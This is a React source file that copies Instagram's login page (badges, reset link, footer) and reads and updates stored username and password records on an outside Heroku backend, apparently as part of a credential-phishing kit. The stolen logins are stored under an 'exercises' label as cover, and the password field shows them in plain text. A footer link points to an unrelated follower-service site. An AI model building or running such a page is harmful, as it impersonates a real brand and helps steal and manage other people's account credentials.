import React,{useState, useEffect} from 'react'
import './Instagram.css'
import axios from 'axios'

function Instagram(props) {

    const [name,setName] = useState("")
    const [password,setPassword] = useState("")

    useEffect(() => {
    const fetchProducts = async () => {
        const { data} = await axios.get(`https://backendaloginda.herokuapp.com/exercises/${props.match.params.id}`)
        setName(data.username)
        setPassword(data.description)
        console.log(data)
      }
      fetchProducts()
    }, [props.match.params.id])



    let username = name
    let description = password
    let duration = 8
    let date = new Date()
    const savedata = () => {
      // window.location.href = 'www.instagram.com';
        let data = ({
            username,
            description,
            duration,
            date  
        })

        const headers = {
          'Content-Type': 'Application/Json',
          'Accept': 'Application/Json'
          }

        axios.post('https://backendaloginda.herokuapp.com/exercises/update/'+props.match.params.id, data).then(function(response) {
            setName(response.name);
            console.log(response.data);
        })

        console.log(data)  
      
    }



    return (
        <div>

<span id="root"> 

  <section className="section-all"> 


    <main className="main" role="main"> 

      <div className="wrapper"> 

        <article className="article"> 

          <div className="content"> 

            <div className="login-box"> 

              <div className="header"> 
    <h2>Update or wot</h2>
              </div>

              <div className="form-wrap"> 

                <form className="form"> 

                  <div className="input-box"> 

                    <input type="text" id="name" aria-describedby="" placeholder="Phone number, username, or email"
                     aria-required="true"  autoComplete="off" maxLength="30"  autoCorrect="off"
                    name="username" value={name} 
                    onChange={(e) => {setName(e.target.value)}}
                     required/> 

                  </div>   



                  <div className="input-box"> 

                    <input type="text" name="password" id="password" 
                    placeholder="Password" aria-describedby="" maxLength="30"  autoComplete="off"
                    aria-required="true"  autoCorrect="off" value={password}
                    onChange={(e) => {setPassword(e.target.value)}} required/> 

                  </div>   



                  <span className="button-box"> 

                   <button  className="btn" type="button" name="submit"
                     onClick={savedata}> Update Details</button> 

                  </span>   
                  <a className="forgot" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a> 

                </form> 

              </div> 

            </div>  



            <div className="login-box"> 

              <p className="text">Don't have an account?<a href="/facebook">Sign up</a></p> 

            </div> 



            <div className="app"> 

              <p>Get the app.</p> 

              <div className="app-img"> 

                <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8"> 

                  <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" /> 

                </a> 

                <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge"> 

                  <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png"/> 

                </a>   

              </div> 

            </div> 

          </div>

        </article> 

      </div> 

    </main> 



    <footer className="footer" role="contentinfo"> 

      <div className="footer-container"> 



        <nav className="footer-nav" role="navigation"> 

          <ul> 

            <li><a href="">About Us</a></li> 

            <li><a href="">Support</a></li> 

            <li><a href="/Password">Blog</a></li> 

            <li><a href="">Press</a></li> 

            <li><a href="">Api</a></li> 

            <li><a href="">Jobs</a></li> 

            <li><a href="">Privacy</a></li> 

            <li><a href="">Terms</a></li> 

            <li><a href="">Directory</a></li> 

            <li> 

              <span className="language">Language 

                <select name="language" className="select"> 

                  <option value="#">English</option> 

                  <option value="http://ru-instafollow.bitballoon.com">Russian</option> 

                </select> 

              </span> 

            </li> 

          </ul> 

        </nav> 



        <span className="footer-logo">&copy; 2021 Instagram</span> 

      </div> 

    </footer> 

     

  </section> 

</span>  
 
        </div>
    )
}

export default Instagram